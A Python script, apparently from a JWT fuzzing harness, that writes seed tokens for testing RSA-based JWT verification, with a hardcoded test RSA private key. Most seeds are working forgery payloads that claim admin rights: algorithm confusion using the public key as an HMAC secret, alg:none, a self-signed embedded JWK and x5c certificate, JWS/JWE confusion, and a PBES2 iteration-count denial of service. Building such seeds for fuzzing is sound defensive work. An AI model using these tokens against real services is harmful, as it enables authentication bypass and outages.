"""Generate RSA-focused JWT seeds for keyless attack testing."""

import base64
import datetime
import hashlib
import hmac
import json
import os

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.x509.oid import NameOID

# Fixed target RSA keypair (same as in jwt_rsa_keys.js and mutator)
PRIV_PEM = """-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCZhm7YI8ysUiK1
V9nHXV9L2I8uU65LnIUCkUrj+RvI0Ra3ZoYQjemCzfoYH26h2uJLjBUCT5j9/n19
KfSTCMmm0Ujgmq+r73qdw1VWaPRLB/+TdbnM3fScaF+AvWBSnwB1YQB+IWJ/fu77
glY4nRKlwEB80QcLKXNuCuJtH0j8SRo7SyXx3rK8rEosHqbGUFl9M1mVUofKrlVG
XM8YtSNPj9i2InCzzpW9pu4F01+MAhhlzeP6ZFA/AZT3iVqmKgL62hUuln0zC+o/
wmbKlV+I1O4ifLiRlUGTT6823lPPPDtAlmmTwrOztbG9GcqpGhHdIkRBxhwWIdo5
Yh5USFgJAgMBAAECggEAGzmx0naWx0BRk2Me5bHzQloHGioQ0KvTEp99bmwwty4N
Hzz5LVpdPKsWXMzGK8HLO6Z920kOUoyc6GNWUfTO/dxDVkFYQd9YGT4YlhhKqjui
4R2Rc3kw9cO0m/n5aO11gVtQYQ2+j+mMq+FzNNr2AZrUVM4kt6AELlGT0dIoeUSf
D9QbkWRlcWktNcEunB7z+rRX9CM9BiBTgLCfOz8Gfgb1aDpN74MOwm9eLUSosNjh
nE+6SMAimtPG2+O4ES2n63a0hLQPZZJrZOIoHtL/uMR1Jgy/1CF6rTsUYiID/cQM
j8W41EN6a+cp4LwrDubay5cVrbYY5EWsv+PVB4I8+QKBgQDQxfk5TbI9IadAKFBV
hgA2Ymzli8MtULMIqjd9BIyLP+iAVOU8GXCthJ5iaRldf3P7rG0BDZ9Rjh0nmqtB
y2h80eRMJgpZmkER836839Tfcuj+aVpdxFEDXF2196nKyLfhLhYnlHZZ28ZNiQD3
Jkw8wcN/rO7go1fIdiUF2QD5jwKBgQC8QQu3CcOMKmctuPLrJgWu2kXBhLWy/uhz
wHznB42pFkYhMpeDa5pujkaawL6idkBCDlRzMUPMLvevlXb3fE85CkjUBBXOiTN/
MPXiub0j4ozecVPrJg0oQolw6nrX4zqCbhV07KgOnLw0fq4WRhlZLBHG5hT7sY3p
o4G2TIJY5wKBgQC/0DTz/ju1yNa2rpNokE5fqTyuBiQT3WIwotuKZISQZ+5BAj7/
YcxR0FgIyNFCQxiX8crQvehT8QM+YO/Z6n4cuGdNw2GdA4mnaZVXCTu29Qe2v6sE
HZvlP5bl2h9JLfMr08ENKm02kCL5F9goOyquY8Qv6P4srEa56jqHzeIEZwKBgCo5
vNL1kbMi37nVvkcYZDXwJ61cgxT/MEymZF29x/yhTmGr42hK/nzF1PhpO1ldhNRM
Oo0MA9UMw+nScLjaXTrCH8vOjsWg6Lgi10RfvRkLe+V5LgWUp2bcZc+6CIvcIAeZ
gZ6UZq3AYka0E4BTgOQLioE+on5COT6qujGVv7cJAoGBAKzXRjslrnwrXUkl/tP+
kNzNTIAvaPu8y0F9+OYWJsDxyId/l3BUFY8IbSnx1AOGPECQYoESnwZm4zqypeet
ctQOMW4xTua4ASGm9F4m3tNjoAaUJRQvTLRUHsN4Sf0mSGA/AUx1HwnG/0RWbsQw
h5J3pXffJY4yolvmOE74Wy7w
-----END PRIVATE KEY-----"""

PUB_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmYZu2CPMrFIitVfZx11f
S9iPLlOuS5yFApFK4/kbyNEWt2aGEI3pgs36GB9uodriS4wVAk+Y/f59fSn0kwjJ
ptFI4Jqvq+96ncNVVmj0Swf/k3W5zN30nGhfgL1gUp8AdWEAfiFif37u+4JWOJ0S
pcBAfNEHCylzbgribR9I/EkaO0sl8d6yvKxKLB6mxlBZfTNZlVKHyq5VRlzPGLUj
T4/YtiJws86VvabuBdNfjAIYZc3j+mRQPwGU94lapioC+toVLpZ9MwvqP8JmypVf
iNTuIny4kZVBk0+vNt5Tzzw7QJZpk8Kzs7WxvRnKqRoR3SJEQcYcFiHaOWIeVEh
YCQIDAQAB
-----END PUBLIC KEY-----"""

priv_key = serialization.load_pem_private_key(PRIV_PEM.encode(), password=None)


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def sign_rs256(signing_input):
    sig = priv_key.sign(signing_input.encode(), padding.PKCS1v15(), hashes.SHA256())
    return b64url(sig)


def sign_hs256_with_pubkey(signing_input):
    sig = hmac.new(PUB_PEM.strip().encode(), signing_input.encode(), hashlib.sha256).digest()
    return b64url(sig)


def make_jwt(header, payload, signer=sign_rs256):
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    si = f"{h}.{p}"
    s = signer(si)
    return f"{si}.{s}"


def main():
    seeds = []

    # 1. Valid RS256 baseline
    seeds.append(("041_rsa_baseline.jwt", make_jwt(
        {"alg": "RS256", "typ": "JWT", "kid": "kid-1"},
        {"sub": "user-123", "iss": "https://issuer.example", "exp": 1893456000, "role": "user"},
    )))

    # 2. Algorithm confusion: RS256->HS256 with public key as HMAC secret (§1-2)
    seeds.append(("042_alg_confusion_rs_to_hs.jwt", make_jwt(
        {"alg": "HS256", "typ": "JWT"},
        {"sub": "admin", "iss": "https://issuer.example", "exp": 1893456000, "role": "admin"},
        signer=sign_hs256_with_pubkey,
    )))

    # 3. Embedded JWK self-signed (§2-3) — attacker's own RSA key
    atk_key = rsa.generate_private_key(65537, 2048)
    atk_pub = atk_key.public_key().public_numbers()
    n_bytes = atk_pub.n.to_bytes((atk_pub.n.bit_length() + 7) // 8, "big")
    e_bytes = atk_pub.e.to_bytes((atk_pub.e.bit_length() + 7) // 8, "big")
    jwk_header = {
        "alg": "RS256", "typ": "JWT",
        "jwk": {
            "kty": "RSA", "n": b64url(n_bytes), "e": b64url(e_bytes),
            "kid": "attacker-1", "use": "sig",
        },
    }
    h = b64url(json.dumps(jwk_header, separators=(",", ":")).encode())
    p = b64url(json.dumps({"sub": "admin", "role": "admin", "exp": 1893456000}, separators=(",", ":")).encode())
    si = f"{h}.{p}"
    sig = atk_key.sign(si.encode(), padding.PKCS1v15(), hashes.SHA256())
    seeds.append(("043_jwk_selfsigned.jwt", f"{si}.{b64url(sig)}"))

    # 4. alg:none with RS256 target (§1-1)
    h = b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64url(json.dumps({"sub": "admin", "role": "admin", "exp": 1893456000}, separators=(",", ":")).encode())
    seeds.append(("044_alg_none_rsa_target.jwt", f"{h}.{p}."))

    # 5. x5c self-signed certificate (§2-4)
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker.example")])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject).issuer_name(issuer)
        .public_key(atk_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime(2024, 1, 1))
        .not_valid_after(datetime.datetime(2030, 1, 1))
        .sign(atk_key, hashes.SHA256())
    )
    cert_b64 = base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()
    x5c_header = {"alg": "RS256", "typ": "JWT", "x5c": [cert_b64]}
    h = b64url(json.dumps(x5c_header, separators=(",", ":")).encode())
    p = b64url(json.dumps({"sub": "admin", "role": "admin", "exp": 1893456000}, separators=(",", ":")).encode())
    si = f"{h}.{p}"
    sig = atk_key.sign(si.encode(), padding.PKCS1v15(), hashes.SHA256())
    seeds.append(("045_x5c_selfsigned.jwt", f"{si}.{b64url(sig)}"))

    # 6. JWS/JWE confusion — fake JWE with unencrypted payload (§7-1)
    jwe_header = {"alg": "RSA-OAEP", "enc": "A128CBC-HS256", "typ": "JWT"}
    payload_json = json.dumps({"sub": "admin", "role": "admin", "exp": 1893456000}, separators=(",", ":"))
    parts = [
        b64url(json.dumps(jwe_header, separators=(",", ":")).encode()),
        b64url(b""),              # encrypted key
        b64url(b"\x00" * 16),     # IV
        b64url(payload_json.encode()),  # "ciphertext" = raw payload
        b64url(b"\x00" * 16),     # auth tag
    ]
    seeds.append(("046_jwe_confusion.jwt", ".".join(parts)))

    # 7. Algorithm confusion with stripped PEM (just base64, no armor)
    stripped = PUB_PEM.replace("-----BEGIN PUBLIC KEY-----", "")
    stripped = stripped.replace("-----END PUBLIC KEY-----", "").replace("\n", "").strip()
    h = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64url(json.dumps({"sub": "admin", "role": "admin", "exp": 1893456000}, separators=(",", ":")).encode())
    si = f"{h}.{p}"
    sig_raw = hmac.new(stripped.encode(), si.encode(), hashlib.sha256).digest()
    seeds.append(("047_alg_confusion_stripped_pem.jwt", f"{si}.{b64url(sig_raw)}"))

    # 8. PBES2 billion hashes DoS (§3-4)
    pbes2_header = {
        "alg": "PBES2-HS256+A128KW", "enc": "A128CBC-HS256",
        "p2s": b64url(b"salt"), "p2c": 2147483647,
    }
    parts = [
        b64url(json.dumps(pbes2_header, separators=(",", ":")).encode()),
        b64url(b"\x00" * 32),
        b64url(b"\x00" * 16),
        b64url(payload_json.encode()),
        b64url(b"\x00" * 16),
    ]
    seeds.append(("048_pbes2_dos.jwt", ".".join(parts)))

    # Write seeds
    seeds_dir = os.path.join(os.path.dirname(__file__), "jwt_seeds")
    os.makedirs(seeds_dir, exist_ok=True)
    for name, content in seeds:
        with open(os.path.join(seeds_dir, name), "w") as f:
            f.write(content)
        print(f"  Created {name} ({len(content)} bytes)")
    print(f"Done: {len(seeds)} RSA seeds")


if __name__ == "__main__":
    main()
